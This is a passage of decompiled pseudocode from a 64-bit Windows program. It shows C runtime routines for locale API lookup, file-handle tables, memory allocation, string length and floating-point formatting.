                                                          (unsigned int *)"\b",
                                                          (unsigned int *)"InitializeCriticalSectionEx");
  if ( v6 )
    return v6(a1, a2, a3);
  else
    return MEMORY[0x76F85980](a1, a2);
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);

//----- (000000013F16EC44) ----------------------------------------------------
__int64 __fastcall sub_13F16EC44(
        __int64 a1,
        unsigned int a2,
        __int64 a3,
        unsigned int a4,
        __int64 a5,
        int a6,
        __int64 a7,
        __int64 a8,
        __int64 a9)
{
  __int64 (__fastcall *v13)(__int64, _QWORD, __int64, _QWORD, __int64, int, __int64, __int64, __int64); // rbx
  unsigned int v15; // eax

  v13 = (__int64 (__fastcall *)(__int64, _QWORD, __int64, _QWORD, __int64, int, __int64, __int64, __int64))sub_13F16E774(0x16u, (__int64)"LCMapStringEx", (unsigned int *)&qword_13F18F918, (unsigned int *)"LCMapStringEx");
  if ( v13 )
    return v13(a1, a2, a3, a4, a5, a6, a7, a8, a9);
  v15 = sub_13F16ED34(a1, 0);
  return MEMORY[0x76F8F800](v15, a2, a3, a4, a5, a6);
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);
// 13F18F918: using guessed type __int64 qword_13F18F918;

//----- (000000013F16ED34) ----------------------------------------------------
__int64 __fastcall sub_13F16ED34(__int64 a1, unsigned int a2)
{
  __int64 (__fastcall *v4)(__int64, _QWORD); // rax

  v4 = (__int64 (__fastcall *)(__int64, _QWORD))sub_13F16E774(
                                                  0x18u,
                                                  (__int64)"LocaleNameToLCID",
                                                  (unsigned int *)&qword_13F18F930,
                                                  (unsigned int *)"LocaleNameToLCID");
  if ( v4 )
    return v4(a1, a2);
  else
    return sub_13F174AAC(a1);
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);
// 13F18F930: using guessed type __int64 qword_13F18F930;

//----- (000000013F16ED9C) ----------------------------------------------------
char sub_13F16ED9C()
{
  memset64(
    qword_13F1C62F0,
    _security_cookie ^ __ROR8__(0i64, 64 - ((unsigned __int8)_security_cookie & 0x3Fu)),
    0x20ui64);
  return 1;
}
// 13F1C62F0: using guessed type __int64 qword_13F1C62F0[];

//----- (000000013F16EDD4) ----------------------------------------------------
char sub_13F16EDD4()
{
  unsigned int (__fastcall *v0)(int *, _QWORD); // rax
  char result; // al
  int v2; // [rsp+30h] [rbp+8h] BYREF

  v0 = (unsigned int (__fastcall *)(int *, _QWORD))sub_13F16E774(
                                                     8u,
                                                     (__int64)"GetCurrentPackageId",
                                                     (unsigned int *)&qword_13F18F8B0,
                                                     (unsigned int *)"GetCurrentPackageId");
  if ( v0 && (v2 = 0, v0(&v2, 0i64) == 122) )
  {
    result = 1;
    _InterlockedExchange(&dword_13F1C63F0, 1);
  }
  else
  {
    _InterlockedExchange(&dword_13F1C63F0, 2);
    return 0;
  }
  return result;
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);
// 13F18F8B0: using guessed type __int64 qword_13F18F8B0;
// 13F1C63F0: using guessed type int dword_13F1C63F0;

//----- (000000013F16EE5C) ----------------------------------------------------
char __fastcall sub_13F16EE5C(char a1)
{
  __int64 *v1; // rbx

  if ( !a1 )
  {
    v1 = qword_13F1C6250;
    do
    {
      if ( *v1 )
      {
        if ( *v1 != -1 )
          MEMORY[0x76F85AC0]();
        *v1 = 0i64;
      }
      ++v1;
    }
    while ( v1 != qword_13F1C62F0 );
  }
  return 1;
}
// 13F1C6250: using guessed type __int64 qword_13F1C6250[];
// 13F1C62F0: using guessed type __int64 qword_13F1C62F0[];

//----- (000000013F16EEA0) ----------------------------------------------------
__int64 sub_13F16EEA0()
{
  int i; // ebx
  __int64 v1; // rax
  unsigned int v3; // [rsp+20h] [rbp-18h]

  v3 = 0;
  sub_13F170628();
  for ( i = 3; i != 512; ++i )
  {
    v1 = *(_QWORD *)(8i64 * i + 0x3CC1F0);
    if ( v1 )
    {
      if ( (*(_DWORD *)(v1 + 20) & 0x2000) != 0 && (unsigned int)sub_13F174B64(*(_QWORD *)(8i64 * i + 0x3CC1F0)) != -1 )
        ++v3;
      MEMORY[0x771B38F0](*(_QWORD *)(8i64 * i + 0x3CC1F0) + 48i64);
      sub_13F16E734(*(_QWORD *)(8i64 * i + 0x3CC1F0));
      *(_QWORD *)(8i64 * i + 0x3CC1F0) = 0i64;
    }
  }
  sub_13F17067C();
  return v3;
}
// 13F1C6050: using guessed type int dword_13F1C6050;
// 13F1C6058: using guessed type __int64 qword_13F1C6058;

//----- (000000013F16EF54) ----------------------------------------------------
__int64 __fastcall sub_13F16EF54(__int64 a1)
{
  __int64 result; // rax

  result = *(_DWORD *)(a1 + 20) >> 13;
  if ( (*(_DWORD *)(a1 + 20) & 0x2000) != 0 )
  {
    result = *(_DWORD *)(a1 + 20) >> 6;
    if ( (*(_DWORD *)(a1 + 20) & 0x40) != 0 )
    {
      sub_13F16E734(*(_QWORD *)(a1 + 8));
      _InterlockedAnd((volatile signed __int32 *)(a1 + 20), 0xFFFFFEBF);
      result = 0i64;
      *(_QWORD *)(a1 + 8) = 0i64;
      *(_QWORD *)a1 = 0i64;
      *(_DWORD *)(a1 + 16) = 0;
    }
  }
  return result;
}

//----- (000000013F16EF94) ----------------------------------------------------
char sub_13F16EF94()
{
  int v0; // eax
  _BYTE *v1; // rsi
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  __int64 v4; // rbp
  __int64 v5; // rcx
  _WORD v7[36]; // [rsp+20h] [rbp-78h] BYREF
  int *v8; // [rsp+68h] [rbp-30h]

  LOBYTE(v0) = MEMORY[0x76F87520](v7);
  if ( v7[33] )
  {
    LOBYTE(v0) = (_BYTE)v8;
    if ( v8 )
    {
      v1 = v8 + 1;
      v2 = 0x2000i64;
      v3 = (_QWORD *)((char *)v8 + *v8 + 4);
      if ( *v8 < 0x2000 )
        v2 = (unsigned int)*v8;
      LOBYTE(v0) = sub_13F173044(v2);
      if ( (int)v2 > 64 )
        v2 = 64i64;
      if ( (_DWORD)v2 )
      {
        v4 = 0i64;
        do
        {
          if ( *v3 != -1i64 && *v3 != -2i64 && (*v1 & 1) != 0 && ((*v1 & 8) != 0 || (v0 = MEMORY[0x76F91790](*v3)) != 0) )
          {
            v5 = qword_13F1C6400[v4 >> 6] + ((unsigned __int64)(v4 & 0x3F) << 6);
            *(_QWORD *)(v5 + 40) = *v3;
            LOBYTE(v0) = *v1;
            *(_BYTE *)(v5 + 56) = *v1;
          }
          ++v4;
          ++v1;
          ++v3;
          --v2;
        }
        while ( v2 );
      }
    }
  }
  return v0;
}
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];
// 13F1C6800: using guessed type int dword_13F1C6800;

//----- (000000013F16F080) ----------------------------------------------------
__int64 sub_13F16F080()
{
  int v0; // edi
  __int64 v1; // r14
  unsigned __int64 v2; // rbx
  __int64 v3; // rax
  __int64 result; // rax
  bool v5; // cf
  __int64 v6; // rcx
  __int64 v7; // rax
  __int64 v8; // rsi

  v0 = 0;
  v1 = 0i64;
  do
  {
    v2 = qword_13F1C6400[(__int64)v0 >> 6] + ((unsigned __int64)(v0 & 0x3F) << 6);
    v3 = *(_QWORD *)(v2 + 40);
    v5 = v3 == -2;
    result = v3 + 2;
    if ( v5 || result == 1 )
    {
      *(_BYTE *)(v2 + 56) = -127;
      if ( v0 )
      {
        if ( v0 == 1 )
          v6 = 4294967285i64;
        else
          v6 = 4294967284i64;
      }
      else
      {
        v6 = 4294967286i64;
      }
      v7 = MEMORY[0x76F8CB80](v6);
      v8 = v7;
      if ( (unsigned __int64)(v7 + 1) <= 1 )
        result = 0i64;
      else
        result = MEMORY[0x76F91790](v7);
      if ( (_DWORD)result )
      {
        *(_QWORD *)(v2 + 40) = v8;
        if ( (unsigned __int8)result == 2 )
        {
          *(_BYTE *)(v2 + 56) |= 0x40u;
        }
        else if ( (unsigned __int8)result == 3 )
        {
          *(_BYTE *)(v2 + 56) |= 8u;
        }
      }
      else
      {
        *(_BYTE *)(v2 + 56) |= 0x40u;
        *(_QWORD *)(v2 + 40) = -2i64;
        result = *(_QWORD *)(v1 + 3981808);
        *(_DWORD *)(result + 24) = -2;
      }
    }
    else
    {
      *(_BYTE *)(v2 + 56) |= 0x80u;
    }
    ++v0;
    v1 += 8i64;
  }
  while ( v0 != 3 );
  return result;
}
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];

//----- (000000013F16F17C) ----------------------------------------------------
char sub_13F16F17C()
{
  char v0; // bl

  sub_13F170628();
  v0 = 0;
  if ( !(unsigned int)sub_13F173044(0) )
  {
    sub_13F16EF94();
    sub_13F16F080();
    v0 = 1;
  }
  sub_13F17067C();
  return v0;
}

//----- (000000013F16F1B8) ----------------------------------------------------
char sub_13F16F1B8()
{
  unsigned __int64 i; // rbx
  __int64 v1; // rcx

  for ( i = 0i64; i < 128; ++i )
  {
    v1 = qword_13F1C6400[i];
    if ( v1 )
    {
      sub_13F172FF4(v1);
      qword_13F1C6400[i] = 0i64;
    }
  }
  return 1;
}
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];

//----- (000000013F16F1F8) ----------------------------------------------------
__int64 __fastcall sub_13F16F1F8(unsigned __int64 a1)
{
  __int64 v1; // rbx
  __int64 result; // rax

  v1 = a1;
  if ( a1 > 0xFFFFFFFFFFFFFFE0ui64 )
  {
LABEL_9:
    *(_DWORD *)sub_13F169DAC() = 12;
    return 0i64;
  }
  else
  {
    if ( !a1 )
      v1 = 1i64;
    while ( 1 )
    {
      result = MEMORY[0x771DDA30](3735552i64, 0i64, v1);
      if ( result )
        break;
      if ( !(unsigned int)sub_13F16D3C0() || !sub_13F16C1D0(v1) )
        goto LABEL_9;
    }
  }
  return result;
}
// 13F1C6A70: using guessed type __int64 qword_13F1C6A70;

//----- (000000013F16F258) ----------------------------------------------------
__int64 __fastcall sub_13F16F258(__int64 a1, _QWORD *a2, unsigned int a3)
{
  unsigned __int8 **v4; // rax
  __int64 v6[3]; // [rsp+20h] [rbp-18h] BYREF

  v4 = (unsigned __int8 **)sub_13F16DE30(v6, a1, a2);
  return sub_13F16DE44(0i64, v4, a3, 1);
}
// 13F16F258: using guessed type __int64 var_18[3];

//----- (000000013F16F288) ----------------------------------------------------
__int64 __fastcall sub_13F16F288(_WORD *a1, unsigned __int8 *a2, unsigned __int64 a3, __int128 *a4)
{
  unsigned int v8; // ebx
  __int64 v9; // rcx
  int v10; // er9
  int v11; // eax
  __int64 v12; // [rsp+30h] [rbp-28h] BYREF
  __int128 v13; // [rsp+38h] [rbp-20h] BYREF
  char v14; // [rsp+48h] [rbp-10h]

  if ( !a2 || !a3 )
    return 0i64;
  if ( !*a2 )
  {
    if ( a1 )
      *a1 = 0;
    return 0i64;
  }
  sub_13F1687CC((__int64)&v12, a4);
  if ( !*(_QWORD *)(v13 + 312) )
  {
    if ( a1 )
      *a1 = *a2;
    v8 = 1;
    goto LABEL_20;
  }
  v8 = 1;
  if ( !(unsigned int)sub_13F170C90(*a2, &v13) )
  {
    if ( (unsigned int)MEMORY[0x76F84FF0](*(unsigned int *)(v13 + 12), 9i64, a2, 1i64, a1, a1 != 0i64) )
      goto LABEL_20;
LABEL_19:
    v8 = -1;
    *(_DWORD *)sub_13F169DAC() = 42;
    goto LABEL_20;
  }
  v9 = v13;
  v10 = *(_DWORD *)(v13 + 8);
  if ( v10 <= 1 || (int)a3 < v10 || (v11 = MEMORY[0x76F84FF0](*(unsigned int *)(v13 + 12), 9i64, a2), v9 = v13, !v11) )
  {
    if ( a3 < *(int *)(v9 + 8) || !a2[1] )
      goto LABEL_19;
  }
  v8 = *(_DWORD *)(v9 + 8);
LABEL_20:
  if ( v14 )
    *(_DWORD *)(v12 + 936) &= ~2u;
  return v8;
}

//----- (000000013F16F3D0) ----------------------------------------------------
__int64 __fastcall sub_13F16F3D0(_WORD *a1, unsigned __int8 *a2, unsigned __int64 a3)
{
  return sub_13F16F288(a1, a2, a3, 0i64);
}

//----- (000000013F16F3D8) ----------------------------------------------------
__int64 __fastcall sub_13F16F3D8(_DWORD *a1, _BYTE *a2, unsigned __int64 a3, unsigned __int16 a4, __int128 *a5)
{
  unsigned int v9; // ebx
  int v10; // eax
  __int64 v11; // [rsp+40h] [rbp-28h] BYREF
  __int64 v12; // [rsp+48h] [rbp-20h]
  char v13; // [rsp+58h] [rbp-10h]
  int v14; // [rsp+78h] [rbp+10h] BYREF
  unsigned __int16 v15; // [rsp+88h] [rbp+20h] BYREF

  v15 = a4;
  if ( a2 || !a3 )
  {
    if ( a1 )
      *a1 = -1;
    if ( a3 > 0x7FFFFFFF )
    {
      v9 = 22;
      *(_DWORD *)sub_13F169DAC() = 22;
      sub_13F1682A0();
      return v9;
    }
    sub_13F1687CC((__int64)&v11, a5);
    if ( !*(_QWORD *)(v12 + 312) )
    {
      if ( v15 > 0xFFu )
      {
        if ( a2 && a3 )
          sub_13F15EF70((__int64)a2, 0, a3);
        goto LABEL_15;
      }
      if ( !a2 )
        goto LABEL_22;
      if ( a3 )
      {
        *a2 = v15;
LABEL_22:
        if ( a1 )
          *a1 = 1;
LABEL_28:
        v9 = 0;
        goto LABEL_16;
      }
LABEL_33:
      v9 = 34;
      *(_DWORD *)sub_13F169DAC() = 34;
      sub_13F1682A0();
LABEL_16:
      if ( v13 )
        *(_DWORD *)(v11 + 936) &= ~2u;
      return v9;
    }
    v14 = 0;
    v10 = MEMORY[0x76F91F80](*(unsigned int *)(v12 + 12), 0i64, &v15, 1i64, a2, a3, 0i64, &v14);
    if ( v10 )
    {
      if ( !v14 )
      {
        if ( a1 )
          *a1 = v10;
        goto LABEL_28;
      }
    }
    else if ( (unsigned int)MEMORY[0x76F91760]() == 122 )
    {
      if ( a2 && a3 )
        sub_13F15EF70((__int64)a2, 0, a3);
      goto LABEL_33;
    }
LABEL_15:
    v9 = 42;
    *(_DWORD *)sub_13F169DAC() = 42;
    goto LABEL_16;
  }
  if ( a1 )
    *a1 = 0;
  return 0i64;
}

//----- (000000013F16F55C) ----------------------------------------------------
__int64 __fastcall sub_13F16F55C(_DWORD *a1, _BYTE *a2, unsigned __int64 a3, unsigned __int16 a4)
{
  return sub_13F16F3D8(a1, a2, a3, a4, 0i64);
}

//----- (000000013F16F570) ----------------------------------------------------
_BYTE *__fastcall sub_13F16F570(_BYTE *a1, unsigned __int64 a2)
{
  _BYTE *v3; // r9
  unsigned __int64 v4; // r10
  _BYTE *v5; // rax
  _BYTE *v6; // rcx
  _BYTE *v7; // rcx
  _BYTE *v8; // r8

  v3 = a1;
  v4 = (32i64 - ((unsigned __int8)a1 & 0x1F)) & -(__int64)(((unsigned __int8)a1 & 0x1F) != 0i64);
  if ( a2 < v4 )
    v4 = a2;
  v5 = &a1[v4];
  while ( a1 != v5 && *a1 )
    ++a1;
  v6 = (_BYTE *)(a1 - v3);
  if ( v6 == (_BYTE *)v4 )
  {
    v7 = &v6[(_QWORD)v3];
    v8 = &v7[a2 - v4 - (((_BYTE)a2 - (_BYTE)v4) & 0x1F)];
    __asm { vxorps  ymm2, ymm2, ymm2 }
    while ( v7 != v8 )
    {
      __asm
      {
        vpcmpeqb ymm1, ymm2, ymmword ptr [rcx]
        vpmovmskb eax, ymm1
      }
      if ( _EAX )
        break;
      v7 += 32;
    }
    while ( v7 != &v3[a2] && *v7 )
      ++v7;
    v6 = (_BYTE *)(v7 - v3);
    __asm { vzeroupper }
  }
  return v6;
}
// 13F1B71A0: using guessed type int dword_13F1B71A0;

//----- (000000013F16F6CC) ----------------------------------------------------
__int64 __fastcall sub_13F16F6CC(_WORD *a1, unsigned __int64 a2)
{
  _WORD *v4; // rax
  _WORD *i; // rdx
  unsigned __int64 v6; // r11
  _WORD *v7; // rdx
  _WORD *v8; // rax
  __int64 v9; // rdx
  _WORD *v10; // rdx
  _WORD *v12; // r11

  if ( ((unsigned __int8)a1 & 1) != 0 )
  {
    v4 = &a1[a2];
    for ( i = a1; i != v4; ++i )
    {
      if ( !*i )
        break;
    }
    return i - a1;
  }
  else
  {
    v6 = ((32i64 - ((unsigned __int8)a1 & 0x1F)) & (unsigned __int64)-(__int64)(((unsigned __int8)a1 & 0x1F) != 0i64)) >> 1;
    if ( a2 < v6 )
      v6 = a2;
    v7 = a1;
    v8 = &a1[v6];
    if ( a1 != v8 )
    {
      do
      {
        if ( !*v7 )
          break;
        ++v7;
      }
      while ( v7 != v8 );
    }
    v9 = v7 - a1;
    if ( v9 == v6 )
    {
      v10 = &a1[v9];
      __asm { vxorps  ymm2, ymm2, ymm2 }
      v12 = &v10[a2 - v6 - (((_BYTE)a2 - (_BYTE)v6) & 0x1F)];
      while ( v10 != v12 )
      {
        __asm
        {
          vpcmpeqw ymm1, ymm2, ymmword ptr [rdx]
          vpmovmskb eax, ymm1
        }
        if ( _EAX )
          break;
        v10 += 16;
      }
      while ( v10 != &a1[a2] && *v10 )
        ++v10;
      v9 = v10 - a1;
      __asm { vzeroupper }
    }
  }
  return v9;
}
// 13F1B71A0: using guessed type int dword_13F1B71A0;

//----- (000000013F16F8BC) ----------------------------------------------------
wchar_t **__fastcall sub_13F16F8BC(__int64 a1, wchar_t ***a2)
{
  wchar_t **result; // rax

  result = &off_13F1B74B0;
  if ( *a2 != &off_13F1B74B0 )
  {
    result = (wchar_t **)*(unsigned int *)(a1 + 936);
    if ( ((unsigned int)result & 0xFFFFFFFE) == 0 )
    {
      result = (wchar_t **)sub_13F173A38();
      *a2 = result;
    }
  }
  return result;
}
// 13F1B74B0: using guessed type wchar_t *off_13F1B74B0;
// 13F1C6820: using guessed type wchar_t **off_13F1C6820;

//----- (000000013F16F8F0) ----------------------------------------------------
__int64 __fastcall sub_13F16F8F0(__int64 a1, __int64 *a2)
{
  __int64 result; // rax

  result = 3946720i64;
  if ( *a2 != 3946720 )
  {
    result = *(unsigned int *)(a1 + 936);
    if ( (result & 0xFFFFFFFE) == 0 )
    {
      result = sub_13F1721A0();
      *a2 = result;
    }
  }
  return result;
}

//----- (000000013F16F924) ----------------------------------------------------
__int64 __fastcall sub_13F16F924(__int64 *a1)
{
  __int64 v1; // rdx

  v1 = *a1;
  if ( (((unsigned __int64)*a1 >> 52) & 0x7FF) != 2047 )
    return 0i64;
  if ( (v1 & 0xFFFFFFFFFFFFFi64) == 0 )
    return 1i64;
  if ( v1 < 0 && (v1 & 0xFFFFFFFFFFFFFi64) == 0x8000000000000i64 )
    return 4i64;
  return ((v1 & 0x8000000000000i64) == 0) | 2u;
}

//----- (000000013F16F98C) ----------------------------------------------------
__int64 __fastcall sub_13F16F98C(
        __int64 *a1,
        __m128i *a2,
        unsigned __int64 a3,
        _BYTE *a4,
        __int64 a5,
        int a6,
        char a7,
        int a8,
        __int128 *a9)
{
  unsigned __int64 v9; // rbx
  __m128i *v10; // rdi
  unsigned int v14; // ebx
  __m128i *v15; // rax
  __int64 v16; // rbp
  __int8 *v17; // rdi
  __int8 *v18; // r14
  __int8 *v19; // rdi
  __int16 v20; // r8
  unsigned __int64 v21; // r9
  unsigned __int16 v22; // ax
  __int8 *i; // rcx
  __int64 v24; // rcx
  _BYTE *v25; // rdi
  _BYTE *v26; // r8
  __int64 v28[3]; // [rsp+50h] [rbp-38h] BYREF
  char v29; // [rsp+68h] [rbp-20h]

  v9 = (unsigned int)a6;
  v10 = a2;
  a2->m128i_i8[0] = 0;
  if ( a6 < 0 )
    v9 = 0i64;
  sub_13F1687CC((__int64)v28, a9);
  if ( a3 <= (int)v9 + 11 )
  {
    v14 = 34;
    *(_DWORD *)sub_13F169DAC() = 34;
    sub_13F1682A0();
    goto LABEL_50;
  }
  if ( (((unsigned __int64)*a1 >> 52) & 0x7FF) == 2047 )
  {
    v14 = sub_13F16FCEC(a1, v10, a3, a4, a5, v9, 0, a8, 0i64);
    if ( v14 )
    {
      v10->m128i_i8[0] = 0;
      goto LABEL_50;
    }
    v15 = sub_13F179210(v10, 101);
    if ( v15 )
    {
      v15->m128i_i8[0] = a7 != 0 ? 80 : 112;
      v15->m128i_i8[3] = 0;
    }
  }
  else
  {
    if ( *a1 < 0 )
    {
      v10->m128i_i8[0] = 45;
      v10 = (__m128i *)((char *)v10 + 1);
    }
    v16 = 1023i64;
    if ( (*a1 & 0x7FF0000000000000i64) != 0 )
    {
      v10->m128i_i8[0] = 49;
      v17 = &v10->m128i_i8[1];
    }
    else
    {
      v10->m128i_i8[0] = 48;
      v17 = &v10->m128i_i8[1];
      v16 = (*a1 & 0xFFFFFFFFFFFFFi64) != 0 ? 0x3FE : 0;
    }
    v18 = v17;
    v19 = v17 + 1;
    if ( (_DWORD)v9 )
      *v18 = ***(_BYTE ***)(v28[1] + 248);
    else
      *v18 = 0;
    if ( (*a1 & 0xFFFFFFFFFFFFFi64) != 0 )
    {
      v20 = 48;
      v21 = 0xF000000000000i64;
      do
      {
        if ( (int)v9 <= 0 )
          break;
        v22 = ((v21 & *a1 & 0xFFFFFFFFFFFFFi64) >> v20) + 48;
        if ( v22 > 0x39u )
          LOBYTE(v22) = (a7 != 0 ? 7 : 39) + v22;
        *v19 = v22;
        v9 = (unsigned int)(v9 - 1);
        ++v19;
        v21 >>= 4;
        v20 -= 4;
      }
      while ( v20 >= 0 );
      if ( v20 >= 0 && (unsigned __int16)((v21 & *a1 & 0xFFFFFFFFFFFFFi64) >> v20) > 8u )
      {
        for ( i = v19 - 1; ((*i - 70) & 0xDF) == 0; --i )
          *i = 48;
        if ( i == v18 )
        {
          ++*(i - 1);
        }
        else if ( *i == 57 )
        {
          *i = a7 != 0 ? 65 : 97;
        }
        else
        {
          ++*i;
        }
      }
    }
    if ( (int)v9 > 0 )
    {
      sub_13F15EF70((__int64)v19, 0x30u, v9);
      v19 += v9;
    }
    if ( !*v18 )
      v19 = v18;
    *v19 = a7 != 0 ? 80 : 112;
    v24 = (((unsigned __int64)*a1 >> 52) & 0x7FF) - v16;
    if ( v24 < 0 )
    {
      v19[1] = 45;
      v25 = v19 + 2;
      v24 = -v24;
    }
    else
    {
      v19[1] = 43;
      v25 = v19 + 2;
    }
    *v25 = 48;
    v26 = v25;
    if ( v24 >= 1000 && (*v25 = v24 / 1000 + 48, ++v25, v24 %= 1000i64, v25 != v26) || v24 >= 100 )
    {
      *v25++ = v24 / 100 + 48;
      v24 %= 100i64;
    }
    if ( v25 != v26 || v24 >= 10 )
    {
      *v25++ = v24 / 10 + 48;
      v24 %= 10i64;
    }
    *v25 = v24 + 48;
    v25[1] = 0;
  }
  v14 = 0;
LABEL_50:
  if ( v29 )
    *(_DWORD *)(v28[0] + 936) &= ~2u;
  return v14;
}

//----- (000000013F16FCEC) ----------------------------------------------------
__int64 __fastcall sub_13F16FCEC(
        __int64 *a1,
        _BYTE *a2,
        unsigned __int64 a3,
        _BYTE *a4,
        __int64 a5,
        int a6,
        char a7,
        int a8,
        __int128 *a9)
{
  _BOOL8 v11; // rcx
  _BOOL8 v12; // rax
  unsigned __int64 v13; // rdx
  __int64 result; // rax
  int v15[6]; // [rsp+40h] [rbp-18h] BYREF

  sub_13F175160(*a1, a6 + 1, (__int64)v15, a4, a5);
  v11 = v15[0] == 45;
  v12 = a6 > 0;
  v13 = a3 - v12 - v11;
  if ( a3 == -1i64 )
    v13 = -1i64;
  result = sub_13F174BD0((__int64)&a2[v12 + v11], v13, a6 + 1, (__int64)v15);
  if ( !(_DWORD)result )
    return sub_13F16FDBC(a2, a3, a6, a7, a8, (__int64)v15, 0, a9);
  *a2 = 0;
  return result;
}

//----- (000000013F16FDBC) ----------------------------------------------------
__int64 __fastcall sub_13F16FDBC(
        _BYTE *a1,
        unsigned __int64 a2,
        int a3,
        char a4,
        int a5,
        __int64 a6,
        char a7,
        __int128 *a8)
{
  int v8; // eax
  __int64 v9; // rbx
  const __m128i *v14; // rdx
  __int64 v15; // r8
  _BYTE *v16; // rdx
  _BYTE *v17; // rbx
  __int64 v18; // rdx
  __m128i *v19; // rcx
  int v20; // er8
  __int64 v21[3]; // [rsp+30h] [rbp-28h] BYREF
  char v22; // [rsp+48h] [rbp-10h]

  v8 = 0;
  v9 = a3;
  if ( a3 > 0 )
    v8 = a3;
  if ( a2 > v8 + 9 )
  {
    sub_13F1687CC((__int64)v21, a8);
    if ( a7 )
    {
      v14 = (const __m128i *)&a1[*(_DWORD *)a6 == 45];
      if ( (int)v9 > 0 )
      {
        v15 = -1i64;
        do
          ++v15;
        while ( v14->m128i_i8[v15] );
        sub_13F15EB00((__m128i *)((char *)v14 + ((int)v9 > 0)), v14, v15 + 1);
      }
    }
    v16 = a1;
    if ( *(_DWORD *)a6 == 45 )
    {
      *a1 = 45;
      v16 = a1 + 1;
    }
    if ( (int)v9 > 0 )
    {
      *v16 = v16[1];
      *++v16 = ***(_BYTE ***)(v21[1] + 248);
    }
    v17 = &v16[v9 + (a7 == 0)];
    v18 = a1 - v17 + a2;
    if ( a2 == -1i64 )
      v18 = -1i64;
    if ( (unsigned int)sub_13F16DD4C(v17, v18, (__int64)"e+000") )
    {
      sub_13F1682F0();
      JUMPOUT(0x13F16FF96i64);
    }
    v19 = (__m128i *)(v17 + 2);
    if ( a4 )
      *v17 = 69;
    if ( **(_BYTE **)(a6 + 8) != 48 )
    {
      v20 = *(_DWORD *)(a6 + 4) - 1;
      if ( v20 < 0 )
      {
        v20 = 1 - *(_DWORD *)(a6 + 4);
        v17[1] = 45;
      }
      if ( v20 >= 100 )
      {
        v17[2] += v20 / 100;
        v20 %= 100;
      }
      if ( v20 >= 10 )
      {
        v17[3] += v20 / 10;
        LOBYTE(v20) = v20 % 10;
      }
      v17[4] += v20;
    }
    if ( a5 == 2 && v19->m128i_i8[0] == 48 )
      sub_13F15EB00(v19, (const __m128i *)(v17 + 3), 3ui64);
    if ( v22 )
      *(_DWORD *)(v21[0] + 936) &= ~2u;
    return 0i64;
  }
  else
  {
    *(_DWORD *)sub_13F169DAC() = 34;
    sub_13F1682A0();
    return 34i64;
  }
}
// 13F16FF91: control flows out of bounds to 13F16FF96

//----- (000000013F16FF98) ----------------------------------------------------
__int64 __fastcall sub_13F16FF98(_BYTE *a1, __int64 a2, int a3, _DWORD *a4, char a5, __int128 *a6)
{
  int v9; // ecx
  __int64 v10; // rsi
  __int64 v11; // r8
  _BYTE *v12; // rbx
  _BYTE *v13; // rbp
  __int64 v14; // r8
  int v15; // ecx
  __int64 v17[3]; // [rsp+20h] [rbp-28h] BYREF
  char v18; // [rsp+38h] [rbp-10h]

  sub_13F1687CC((__int64)v17, a6);
  v9 = a4[1] - 1;
  if ( a5 && v9 == a3 )
    *(_WORD *)&a1[(*a4 == 45) + v9] = 48;
  if ( *a4 == 45 )
    *a1++ = 45;
  v10 = -1i64;
  if ( (int)a4[1] > 0 )
  {
    v12 = &a1[a4[1]];
  }
  else
  {
    v11 = -1i64;
    do
      ++v11;
    while ( a1[v11] );
    sub_13F15EB00((__m128i *)(a1 + 1), (const __m128i *)a1, v11 + 1);
    *a1 = 48;
    v12 = a1 + 1;
  }
  if ( a3 > 0 )
  {
    v13 = v12 + 1;
    v14 = -1i64;
    do
      ++v14;
    while ( v12[v14] );
    sub_13F15EB00((__m128i *)(v12 + 1), (const __m128i *)v12, v14 + 1);
    *v12 = ***(_BYTE ***)(v17[1] + 248);
    v15 = a4[1];
    if ( v15 < 0 )
    {
      if ( a5 || -v15 < a3 )
        a3 = -v15;
      if ( a3 )
      {
        do
          ++v10;
        while ( v13[v10] );
        sub_13F15EB00((__m128i *)&v13[a3], (const __m128i *)(v12 + 1), v10 + 1);
      }
      sub_13F15EF70((__int64)(v12 + 1), 0x30u, a3);
    }
  }
  if ( v18 )
    *(_DWORD *)(v17[0] + 936) &= ~2u;
  return 0i64;
}

//----- (000000013F1700E0) ----------------------------------------------------
__int64 __fastcall sub_13F1700E0(
        __int64 *a1,
        _BYTE *a2,
        unsigned __int64 a3,
        _BYTE *a4,
        __int64 a5,
        int a6,
        char a7,
        int a8,
        __int128 *a9)
{
  __int64 v9; // rcx
  _BOOL8 v12; // rcx
  int v13; // er14
  unsigned __int64 v14; // rdx
  _BYTE *v15; // rbx
  __int64 result; // rax
  int v17; // eax
  _QWORD v19[3]; // [rsp+40h] [rbp-18h] BYREF

  v9 = *a1;
  v19[0] = 0i64;
  v19[1] = 0i64;
  sub_13F175160(v9, a6, (__int64)v19, a4, a5);
  v12 = LODWORD(v19[0]) == 45;
  v13 = HIDWORD(v19[0]) - 1;
  v14 = a3 - v12;
  v15 = &a2[v12];
  if ( a3 == -1i64 )
    v14 = -1i64;
  result = sub_13F174BD0((__int64)&a2[v12], v14, a6, (__int64)v19);
  if ( (_DWORD)result )
  {
    *a2 = 0;
  }
  else
  {
    v17 = HIDWORD(v19[0]) - 1;
    if ( HIDWORD(v19[0]) - 1 < -4 || v17 >= a6 )
    {
      return sub_13F16FDBC(a2, a3, a6, a7, a8, (__int64)v19, 1, a9);
    }
    else
    {
      if ( v13 < v17 )
      {
        while ( *v15++ )
          ;
        *(v15 - 2) = 0;
      }
      return sub_13F16FF98(a2, a3, a6, v19, 1, a9);
    }
  }
  return result;
}

//----- (000000013F170218) ----------------------------------------------------
__int64 __fastcall sub_13F170218(int a1, unsigned __int8 a2, _BYTE *a3, unsigned __int64 a4, char a5)
{
  _BYTE *v6; // r9
  __int64 result; // rax
  __int64 v8; // rdx
  unsigned __int64 v9; // rax
  __int64 v10[16]; // [rsp+30h] [rbp-41h]

  v6 = a3;
  if ( a4 >= (unsigned __int64)a2 + 4 )
  {
    if ( a2 )
    {
      v6 = a3 + 1;
      *a3 = 45;
      --a4;
      a3[1] = 0;
    }
    v10[4] = (__int64)"NAN";
    v10[5] = (__int64)"NAN";
    v10[0] = (__int64)"INF";
    v10[1] = (__int64)"INF";
